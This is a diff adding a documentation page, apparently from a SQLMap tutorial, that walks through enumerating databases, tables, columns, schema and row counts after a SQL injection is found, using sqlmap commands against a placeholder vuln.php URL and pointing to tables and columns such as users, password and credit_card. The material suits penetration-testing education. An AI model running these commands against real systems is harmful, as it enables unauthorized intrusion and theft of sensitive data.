@@ -1,0 +1,78 @@
+---
+title: Enumerating Database Structure
+description: Learn how to explore database structure and schema using SQLMap
+---
+
+# Enumerating Database Structure
+
+Once you've confirmed a SQL injection vulnerability, the next step is often to enumerate the database structure to understand what data is available.
+
+## Listing All Databases (`--dbs`)
+
+To list all databases accessible to the current user:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --dbs
+```
+
+This command will retrieve all database names that the web application's database user can access. This is typically the first step in database enumeration as it gives you a high-level overview of the target system.
+
+## Selecting a Database (`--current-db`, `-D`)
+
+To identify the current database being used by the application:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --current-db
+```
+
+To specify a database for further enumeration:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" -D database_name
+```
+
+This allows you to focus your enumeration efforts on the most relevant database.
+
+## Listing Tables in a Database (`--tables`)
+
+Once you've identified a database of interest, list its tables:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" -D database_name --tables
+```
+
+This command retrieves all table names in the specified database. In a real-world scenario, you might look for tables with names like "users", "admin", "accounts", or "customers" that could contain valuable information.
+
+## Listing Columns in a Table (`--columns`)
+
+After identifying interesting tables, examine their structure:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" -D database_name -T table_name --columns
+```
+
+This reveals the column names and data types in the specified table. Look for columns like "username", "password", "email", "credit_card", etc., that might contain sensitive information.
+
+## Getting Schema Information (`--schema`)
+
+For a comprehensive view of the entire database schema:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" --schema
+```
+
+This command retrieves the complete database schema, including all databases, tables, and columns. This is useful for getting a complete picture of the database structure, but it can generate a large amount of output for complex databases.
+
+<Note title="Tip">
+You can combine these commands with output formatting options like `--output-dir` to save results to a specific directory for later analysis.
+</Note>
+
+## Counting Records in a Table (`--count`)
+
+To get the number of records in a table without retrieving the actual data:
+
+```bash
+sqlmap -u "http://www.example.com/vuln.php?id=1" -D database_name -T table_name --count
+```
+
+This is useful for determining the size of a table before attempting to extract its data, especially for large tables where data extraction might be time-consuming.
